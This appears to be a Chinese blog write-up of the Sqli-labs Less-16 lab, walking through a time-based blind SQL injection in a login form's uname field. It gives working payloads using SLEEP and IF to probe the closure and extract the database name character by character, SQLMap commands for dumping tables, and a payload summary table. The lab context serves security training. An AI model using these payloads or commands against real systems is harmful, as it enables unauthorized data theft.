---
title: Sqli-labs Less-16 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, POST注入, 时间盲注]
---
## 一、 漏洞概述
- **关卡**：Less-16
- **漏洞类型**：基于时间延迟的 POST 型盲注（Time-Based Blind POST SQL Injection）
- **注入点**：登录表单的 `uname` 参数
- **闭合方式**：双引号加括号 `")`

## 二、 渗透测试过程

### 1. 探测注入点与闭合方式
访问 Less-16 关卡，页面为登录表单。抓取 POST 请求包。
与 Less-15 类似，输入 `admin'`、`admin"` 或 `admin')` 页面均无任何变化，也没有提示登录失败，属于完全“盲注”状态。

由于无法通过页面内容判断，直接使用 `SLEEP()` 函数测试闭合方式：
尝试单引号闭合：`admin' AND sleep(5) #`，页面秒响应，说明不是单引号闭合。
尝试双引号加括号闭合：
```text
uname=admin") AND sleep(5) #&passwd=123&submit=Submit
```

结果：放行请求后，页面加载卡顿约 5 秒才响应。这证明后端 SQL 语句的包裹形式为 ("$uname")，且成功利用 # 注释掉了后面的代码。

### 2. 确认时间盲注特征

使用 IF(condition, sleep(3), 1) 函数构造逻辑判断。

· 条件为真：
  ```text
  uname=admin") AND if(1=1, sleep(3), 1) #&passwd=123&submit=Submit
  ```
  （放行后页面明显卡顿 3 秒）
· 条件为假：
  ```text
  uname=admin") AND if(1=2, sleep(3), 1) #&passwd=123&submit=Submit
  ```
  （放行后页面秒响应）

由此确认存在基于时间的盲注漏洞。

### 3. 手工盲注猜解数据

通过页面的响应延迟时间来推断条件真假，逐字猜解数据：

· 判断数据库名长度：
  ```text
  uname=admin") AND if(length(database())=8, sleep(3), 1) #&passwd=123&submit=Submit
  ```
  （如果卡顿，说明数据库名长度为 8）
· 猜解数据库名首字母（ASCII码）：
  ```text
  uname=admin") AND if(ascii(substr(database(),1,1))>100, sleep(3), 1) #&passwd=123&submit=Submit
  ```
  （通过二分法不断调整数值，根据页面是否卡顿来还原字符）

注：纯手工时间盲注效率极低，实战中仅用于漏洞验证，获取数据必须依赖工具自动化。

## 三、 自动化利用 (SQLMap)

使用 SQLMap 处理 POST 型时间盲注。将 Burp 拦截到的请求保存为 less16.txt。

```bash
# 指定使用时间盲注技术 (T)，并设置延时阈值 (--time-sec)
sqlmap -r less16.txt --technique T --time-sec 5 --batch --current-db

# 获取指定数据库下的表名
sqlmap -r less16.txt --technique T --time-sec 5 --batch -D security --tables
```

(技巧：在跑时间盲注时，SQLMap 默认的并发数可能会引起误差，可以通过 --threads 1 强制单线程运行，提高准确率。)

## 四、 通关 Payload 汇总

测试目的 Payload (仅限 uname 字段) 页面响应状态
测试闭合与延时 admin") AND sleep(5) # 卡顿约 5 秒
条件为真 admin") AND if(1=1, sleep(3), 1) # 卡顿约 3 秒
条件为假 admin") AND if(1=2, sleep(3), 1) # 秒响应
猜解长度 admin") AND if(length(database())=8, sleep(3), 1) # 条件成立则卡顿
